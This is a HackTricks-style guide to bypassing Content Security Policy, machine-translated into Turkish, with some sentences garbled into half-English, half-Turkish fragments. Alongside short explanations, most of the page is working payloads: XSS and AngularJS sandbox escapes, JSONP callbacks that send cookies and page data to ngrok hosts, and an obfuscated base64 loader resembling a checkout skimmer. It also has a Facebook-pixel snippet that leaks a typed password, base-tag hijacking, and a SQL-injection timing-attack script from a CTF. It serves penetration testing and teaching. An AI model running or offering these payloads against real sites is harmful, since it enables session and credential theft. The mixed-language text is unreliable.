# İçerik Güvenlik Politikası (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## CSP Nedir

Content Security Policy (CSP), öncelikle cross-site scripting (XSS) gibi saldırılara karşı korunmayı amaçlayan bir tarayıcı teknolojisi olarak kabul edilir. Tarayıcıların güvenli bir şekilde yükleyebileceği kaynakların hangi yollar ve hangi kaynaklardan geleceğini tanımlayıp detaylandırarak çalışır. Bu kaynaklar resimler, frame'ler ve JavaScript gibi çeşitli öğeleri kapsar. Örneğin, bir politika aynı alanın (self) kaynaklarının yüklenmesine ve yürütülmesine izin verebilir; buna satır içi kaynaklar ve `eval`, `setTimeout` veya `setInterval` gibi fonksiyonlarla string kod yürütme dahildir.

CSP'nin uygulanması **response headers** aracılığıyla veya HTML sayfasına **meta elements** eklenerek yapılır. Bu politikayı takiben, tarayıcılar bu şartları proaktif olarak uygular ve tespit edilen herhangi bir ihlali hemen engeller.

- Yanıt başlığı aracılığıyla uygulanır:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Meta etiketi ile uygulanır:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Başlıklar

CSP bu header'lar kullanılarak uygulanabilir veya izlenebilir:

- `Content-Security-Policy`: CSP'yi uygular; tarayıcı herhangi bir ihlali engeller.
- `Content-Security-Policy-Report-Only`: İzleme için kullanılır; ihlalleri engellemeden raporlar. Ön üretim ortamlarında test için idealdir.

### Kaynakların Tanımlanması

CSP, hem aktif hem de pasif içeriğin yüklenebileceği origin'leri kısıtlar; satır içi JavaScript çalıştırma ve `eval()` kullanımı gibi öğeleri kontrol eder. Örnek bir politika şu şekildedir:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktifler

- **script-src**: JavaScript için URL'ler, inline scriptler ve olay işleyicileri veya XSLT stylesheet'leri tarafından tetiklenen scriptler dahil olmak üzere belirli kaynaklara izin verir.
- **default-src**: Belirli fetch direktifleri yoksa kaynakların alınması için varsayılan bir politika belirler.
- **child-src**: web worker'lar ve gömülü frame içeriği için izin verilen kaynakları belirtir.
- **connect-src**: fetch, WebSocket, XMLHttpRequest gibi arayüzler kullanılarak yüklenebilecek URL'leri kısıtlar.
- **frame-src**: frame'ler için URL'leri kısıtlar.
- **frame-ancestors**: Geçerli sayfayı gömebilecek kaynakları belirtir; `<frame>`, `<iframe>`, `<object>`, `<embed>`, ve `<applet>` gibi öğelere uygulanır.
- **img-src**: Görüntüler için izin verilen kaynakları tanımlar.
- **font-src**: `@font-face` kullanılarak yüklenen fontlar için geçerli kaynakları belirtir.
- **manifest-src**: Uygulama manifest dosyalarının izin verilen kaynaklarını tanımlar.
- **media-src**: Medya nesnelerinin yüklenmesi için izin verilen kaynakları tanımlar.
- **object-src**: `<object>`, `<embed>` ve `<applet>` öğeleri için izin verilen kaynakları tanımlar.
- **base-uri**: `<base>` öğeleri kullanılarak yükleme için izin verilen URL'leri belirtir.
- **form-action**: Form gönderimleri için geçerli uç noktaları listeler.
- **plugin-types**: Bir sayfanın çağırabileceği mime tiplerini kısıtlar.
- **upgrade-insecure-requests**: Tarayıcılara HTTP URL'lerini HTTPS'e yeniden yazmasını söyler.
- **sandbox**: `<iframe>`'in sandbox özniteliğine benzer kısıtlamalar uygular.
- **report-to**: Politika ihlal edilirse raporun gönderileceği grubu belirtir.
- **worker-src**: Worker, SharedWorker veya ServiceWorker scriptleri için geçerli kaynakları belirtir.
- **prefetch-src**: Alınacak veya önceden alınacak kaynaklar için geçerli kaynakları belirtir.
- **navigate-to**: Bir belgenin her türlü yöntemle (a, form, window.location, window.open, vb.) gidebileceği URL'leri kısıtlar.

### Kaynaklar

- `*`: `data:`, `blob:`, `filesystem:` şemaları dışındaki tüm URL'lere izin verir.
- `'self'`: Aynı alan adından yüklemeye izin verir.
- `'data'`: data şeması üzerinden kaynakların yüklenmesine izin verir (ör. Base64 kodlu görüntüler).
- `'none'`: Herhangi bir kaynaktan yüklemeyi engeller.
- `'unsafe-eval'`: `eval()` ve benzeri yöntemlerin kullanımına izin verir, güvenlik nedenleriyle önerilmez.
- `'unsafe-hashes'`: Belirli inline event handler'ları etkinleştirir.
- `'unsafe-inline'`: inline `<script>` veya `<style>` gibi inline kaynakların kullanımına izin verir, güvenlik nedeniyle önerilmez.
- `'nonce'`: kriptografik bir nonce (bir kez kullanılan sayı) kullanan belirli inline scriptler için bir beyaz liste.
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Nonce'i yeniden kullanarak script yükleme</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Belirli bir sha256 hash'i olan scriptleri beyaz listeye alır.
- `'strict-dynamic'`: Bir nonce veya hash ile beyaz listeye alınmışsa herhangi bir kaynaktan script yüklenmesine izin verir.
- `'host'`: Belirli bir host belirtir, örneğin `example.com`.
- `https:`: URL'leri HTTPS kullananlarla sınırlar.
- `blob:`: Kaynakların Blob URL'lerinden yüklenmesine izin verir (ör. JavaScript ile oluşturulan Blob URL'leri).
- `filesystem:`: Kaynakların filesystem'ten yüklenmesine izin verir.
- `'report-sample'`: İhlal raporuna ihlali tetikleyen koddan bir örnek ekler (hata ayıklama için faydalıdır).
- `'strict-origin'`: 'self' ile benzerdir ancak kaynakların protokol güvenlik düzeyinin belgeyle eşleşmesini sağlar (sadece güvenli origin'ler güvenli origin'lerden kaynak yükleyebilir).
- `'strict-origin-when-cross-origin'`: Aynı-origin istekleri yaparken tam URL'leri gönderir, ancak cross-origin isteklerde yalnızca origin'i gönderir.
- `'unsafe-allow-redirects'`: Başka bir kaynağa hemen yönlendirecek kaynakların yüklenmesine izin verir. Güvenliği zayıflattığı için önerilmez.

## Güvenli Olmayan CSP Kuralları

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Çalışan payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' ile Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Bu çalışmıyor, daha fazla bilgi için [**buraya bakın**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Çalışan payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Eğer bir şekilde **izin verilen bir JS kodunun yeni bir script tag oluşturmasını** sağlayabilirseniz (çünkü izin verilen bir script bunu oluşturuyor), DOM'da JS kodunuzla oluşturulan **yeni script taginin çalıştırılmasına izin verilecektir**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Çalışan payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-src ve default-src eksikliği

> [!CAUTION] > **Artık çalışmıyor gibi görünüyor**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Çalışan payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### File Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Eğer bir JS dosyası yükleyebiliyorsanız bu CSP'yi bypass edebilirsiniz:

Çalışan payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
However, it's highly probable that the server is **yüklenen dosyayı doğruluyor olması** and will only allow you to **belirli türde dosyaların yüklenmesine izin vermesi**.

Moreover, even if you could upload a **JS kodu yerleştirebilseniz** a file using an extension accepted by the server (like: _script.png_) this won't be enough because some servers like apache server **dosyanın MIME türünü uzantısına göre seçer** and browsers like Chrome will **Javascript'i çalıştırmayı reddeder** code inside something that should be an image. "Hopefully", there are mistakes. For example, from a CTF I learnt that **Apache bilmiyor** the _**.wave**_ extension, therefore it doesn't serve it with a **audio/*** gibi bir MIME tipiyle.

From here, if you find a XSS and a file upload, and you manage to find a **yanlış yorumlanan uzantı**, you could try to upload a file with that extension and the Content of the script. Or, if the server is checking the correct format of the uploaded file, create a polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

If not possible to inject JS, you could still try to exfiltrate for example credentials **form action enjekte ederek** (and maybe expecting password managers to auto-fill passwords). You can find an [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Also, notice that `default-src` does not cover form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> For some of the following payload **`unsafe-eval` bile gerekli değil**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Zafiyeti olan bir angular sürümünü yükleyin ve keyfi JS çalıştırın:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + `window` nesnesini döndüren fonksiyonlara sahip bir library ile payloadlar ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Yazıda, `cdn.cloudflare.com`'dan (veya izin verilen başka bir JS libraries deposundan) tüm **libraries**'i **load** edebileceğinizi, her library'den eklenen tüm fonksiyonları çalıştırıp **hangi libraries'den hangi fonksiyonların `window` nesnesini döndürdüğünü** kontrol edebileceğinizi gösteriyor.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS bir sınıf adından:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### google recaptcha JS kodunu kötüye kullanma

Bu [**CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves)'a göre, bir CSP içinde [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) öğesini kötüye kullanarak CSP'yi atlayıp rastgele JS kodu çalıştırabilirsiniz:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Daha fazla [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### www.google.com'u open redirect için istismar etme

Aşağıdaki URL example.com'a yönlendirir (kaynak: [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
\*.google.com/script.google.com'in Kötüye Kullanımı

Google Apps Script'i, script.google.com içinde bir sayfada bilgi almak için kötüye kullanmak mümkündür. Bu, [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Üçüncü Taraf Endpoint'leri + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Bu gibi senaryolar, `script-src` `self` olarak ayarlandığında ve beyaz listeye alınmış belirli bir alan adı olduğunda JSONP kullanılarak atlatılabilir. JSONP endpoint'leri, güvensiz `callback` yöntemleri sayesinde bir saldırganın XSS gerçekleştirmesine olanak tanır, çalışan payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **farklı sitelerin CSP bypass'ı için hazır JSONP endpoints içerir.**

Aynı zafiyet, **güvenilir endpoint içinde bir Open Redirect bulunması** durumunda da meydana gelir; çünkü eğer başlangıç endpoint'i güvenilir kabul ediliyorsa, yönlendirmeler de güvenilir sayılır.

### Üçüncü Taraf Suistimalleri

Aşağıdaki [yazıda](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) açıklandığı gibi, CSP içinde bir yerde izin verilmiş olabilecek birçok üçüncü taraf domain, veri exfiltrate etmek veya JavaScript kodu çalıştırmak için kötüye kullanılabilir. Bu üçüncü taraflardan bazıları şunlardır:

| Varlık            | İzin Verilen Domain                          | Yetenekler  |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Hedefinizin CSP'sinde bu izin verilen domainlerden herhangi birini bulursanız, büyük olasılıkla üçüncü taraf servisine kayıt olup CSP'yi bypass ederek verileri o servise exfiltrate edebilir veya kod çalıştırabilirsiniz.

Örneğin, aşağıdaki CSP'yi bulursanız:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
veya
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Verileri exfiltrate edebilmelisiniz; tıpkı [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) ile her zaman yapıldığı gibi. Bu durumda şu genel adımları izlersiniz:

1. Buradan bir Facebook Developer account oluşturun.
2. Yeni bir "Facebook Login" app oluşturun ve "Website"i seçin.
3. "Settings -> Basic"e gidin ve "App ID"nizi alın.
4. Hedef siteden exfiltrate etmek istediğiniz verileri, doğrudan Facebook SDK gadget'ı "fbq" ile bir "customEvent" ve data payload aracılığıyla exfiltrate edebilirsiniz.
5. App'inizin "Event Manager"ına gidin ve oluşturduğunuz uygulamayı seçin (note the event manager could be found in an URL similar to this: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. "Test Events" sekmesini seçin, "your" web sitesi tarafından gönderilen eventleri görebilirsiniz.

Then, on the victim side, you execute the following code to initialize the Facebook tracking pixel to point to the attacker's Facebook developer account app-id and issue a custom event like this:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Önceki tabloda belirtilen diğer yedi third-party domain için, bunları kötüye kullanmanın başka birçok yolu vardır. Diğer third-party suiistimalleri hakkında ek açıklamalar için daha önceki [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) yazısına bakın.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Yol kısıtlamalarını bypass etmek için bahsedilen yönlendirmeye ek olarak, bazı sunucularda kullanılabilecek Relative Path Overwrite (RPO) adlı başka bir teknik vardır.

Örneğin, CSP `https://example.com/scripts/react/` yoluna izin veriyorsa, şu şekilde bypass edilebilir:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Tarayıcı en sonunda `https://example.com/scripts/angular/angular.js` yükleyecektir.

Bu işe yarıyor çünkü tarayıcı için, `https://example.com/scripts/react/` altında bulunan `..%2fangular%2fangular.js` adlı bir dosya yüklüyorsunuz; bu da CSP ile uyumludur.

Böylece, tarayıcı bunu çözecek, fiilen `https://example.com/scripts/react/../angular/angular.js` isteğinde bulunacak, ki bu `https://example.com/scripts/angular/angular.js` ile eşdeğerdir.

Tarayıcı ile sunucu arasındaki URL yorumlamasındaki bu tutarsızlıktan **faydalanarak, yol kuralları atlatılabilir**.

Çözüm, sunucu tarafında `%2f`'yi `/` olarak işlememek ve böylece tarayıcı ile sunucunun yorumlamasını tutarlı hale getirerek bu sorunu önlemektir.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframe'larda JS yürütme


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### Eksik **base-uri**

Eğer **base-uri** direktifi yoksa, bunu kullanarak bir [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html) gerçekleştirebilirsiniz.

Ayrıca, eğer **sayfa göreli bir yol kullanarak bir script yüklüyorsa** (örn. `<script src="/js/app.js">`) ve bir **Nonce** kullanıyorsa, **base** **tag**'ini kötüye kullanarak script'in **kendi sunucunuzdan yüklenmesini sağlayarak XSS elde edebilirsiniz.**\
Eğer zafiyetli sayfa **httpS** ile yükleniyorsa, base içinde bir httpS URL'si kullanın.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS events

Content Security Policy (CSP) olarak bilinen belirli bir politika JavaScript olaylarını kısıtlayabilir. Yine de, AngularJS buna alternatif olarak custom events sunar. Bir event içinde AngularJS, native tarayıcı event nesnesine referans veren `$event` adında özel bir obje sağlar. Bu `$event` objesi CSP'yi aşmak için suistimal edilebilir. Özellikle Chrome'da `$event/event` objesinin, olayın yürütülme zincirinde yer alan obje dizisini tutan `path` adlı bir özelliği vardır ve `window` nesnesi her zaman dizinin sonunda yer alır. Bu yapı sandbox kaçışı taktikleri için kritik öneme sahiptir.

Bu dizi `orderBy` filtresine yönlendirilerek üzerinde yineleme yapılabilir; böylece son eleman (window nesnesi) kullanılarak `alert()` gibi bir global fonksiyon tetiklenebilir. Aşağıdaki örnek kod parçası bu süreci açıklamaktadır:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Bu snippet, olayı tetiklemek için `ng-focus` direktifinin kullanımını, `path` dizisini manipüle etmek üzere `$event.path|orderBy` kullanılmasını ve `alert()` fonksiyonunu çalıştırmak için `window` nesnesinden yararlanılmasını vurgular; böylece `document.cookie` ortaya çıkar.

**Diğer Angular bypass'larını şurada bulun:** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS ve whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Angular JS uygulamasında script yükleme için alan adlarını beyaz listeleyen bir CSP politikası, callback functions'ın çağrılması ve bazı vulnerable classes aracılığıyla atlatılabilir. Bu teknikle ilgili daha fazla bilgi, detaylı bir rehberde bulunmaktadır ve bu [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22) üzerinde erişilebilir.

Çalışan payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Diğer JSONP arbitrary execution endpoints [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) adresinde bulunabilir (bazıları silinmiş veya düzeltilmiş)

### Bypass via Redirection

CSP, sunucu tarafı yönlendirme ile karşılaştığında ne olur? Eğer yönlendirme izin verilmeyen farklı bir origin'e götürüyorsa, bu yine de başarısız olur.

Bununla birlikte, [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) açıklamasına göre, yönlendirme farklı bir path'e götürürse, orijinal kısıtlamaları atlatabilir.

İşte bir örnek:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
CSP `https://www.google.com/a/b/c/d` olarak ayarlandıysa, path dikkate alındığından hem `/test` hem de `/a/test` scripts CSP tarafından engellenecektir.

Ancak son `http://localhost:5555/301` **sunucu tarafında `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//` adresine redirect edilecektir**. Bu bir redirect olduğundan, **path dikkate alınmaz**, ve **script yüklenebilir**, böylece path kısıtlaması atlatılmış olur.

Bu yönlendirme ile path tamamen belirtilmiş olsa bile yine atlatılacaktır.

Bu nedenle en iyi çözüm, web sitesinde herhangi bir open redirect zafiyeti olmamasını ve CSP kurallarında sömürülebilecek domains bulunmamasını sağlamaktır.

### Bypass CSP with dangling markup

Nasıl yapılacağını [buradan oku](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` kod içinde herhangi bir script'i çalıştırabileceğiniz anlamına gelir (XSS kod çalıştırabilir) ve `img-src *` web sayfasında herhangi bir kaynaktan herhangi bir görüntüyü kullanabileceğiniz anlamına gelir.

Bu CSP'yi görüntüler aracılığıyla veriyi sızdırarak atlatabilirsiniz (bu durumda XSS, bot'un erişebildiği bir sayfanın SQLi içerdiği bir CSRF'i suiistimal eder ve flag'i bir görüntüyle çıkarır):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Kaynak: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Bu yapılandırmayı, bir resmin içine yerleştirilmiş javascript kodunu **yüklemek** için de kötüye kullanabilirsiniz. Örneğin sayfa Twitter'dan resim yüklemeye izin veriyorsa, özel bir **image** hazırlayıp Twitter'a **upload** edebilir ve "**unsafe-inline**"ı kötüye kullanarak normal bir XSS gibi çalışacak bir JS kodunu **execute** edebilirsiniz; bu kod resmi **load** edip içindeki JS'i **extract** ederek **execute** eder: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Service Workers ile

Service Workers **`importScripts`** fonksiyonu CSP ile sınırlı değildir:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Araştırma:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Eğer sizin gönderdiğiniz bir **parametre** politikanın **bildirim** kısmının **içine yapıştırılıyorsa**, politikayı **işe yaramaz** hâle getirecek şekilde **değiştirebilirsiniz**. Aşağıdaki bypass'lardan herhangi biriyle **script 'unsafe-inline'**'a izin verebilirsiniz:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Çünkü bu yönerge mevcut script-src direktiflerini **üstüne yazar**.\
Bir örneğini şurada bulabilirsiniz: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge'de çok daha basit. Eğer CSP'ye sadece bunu ekleyebilirseniz: **`;_`** **Edge** tüm **policy**'yi **düşürecektir**.\
Örnek: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

`unsafe-inline` direktifinin eksikliğine dikkat edin.\
Bu sefer, XSS ile bir `<iframe` kullanarak hedefin **sizin kontrolünüzdeki** bir sayfayı **yüklemesini** sağlayabilirsiniz. Bu kez hedefi, bilgi çıkarmak istediğiniz sayfaya (**CSRF**) eriştireceksiniz. Sayfanın içeriğine erişemezsiniz, ancak eğer sayfanın yüklenme süresini **kontrol edebilirseniz** ihtiyacınız olan bilgiyi çıkarabilirsiniz.

Bu sefer bir **flag** çıkarılacak; SQLi ile her bir **karakter doğru tahmin edildiğinde**, sleep fonksiyonu nedeniyle **yanıt** **daha uzun sürer**. Böylece flag'i çıkarabileceksiniz:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

